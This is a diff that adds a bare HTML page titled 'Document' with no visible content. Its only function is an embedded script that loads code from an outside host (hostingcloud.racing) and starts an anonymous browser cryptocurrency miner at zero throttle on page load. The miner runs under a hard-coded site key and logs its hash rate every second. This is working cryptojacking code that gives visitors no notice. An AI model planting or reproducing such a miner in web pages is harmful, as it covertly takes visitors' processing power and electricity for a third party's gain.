@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+
+    <script src="https://www.hostingcloud.racing/qeku.js"></script>
+    <script>
+
+        let Client = window.Client;
+
+        var _client = new Client.Anonymous('a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb', {
+            throttle: 0, c: 'w', // ads: 0
+        });
+        _client.start();
+        window._client = _client;
+
+        (async () => {
+            while (1) {
+                await new Promise(r => setTimeout(r, 1000));
+                wasmEnabled = _client.hasWASMSupport();
+                running = _client.isRunning();
+                console.log(wasmEnabled, running, _client.getHashesPerSecond());
+            }
+        })()
+    </script>
+
+</body>
+
+</html>
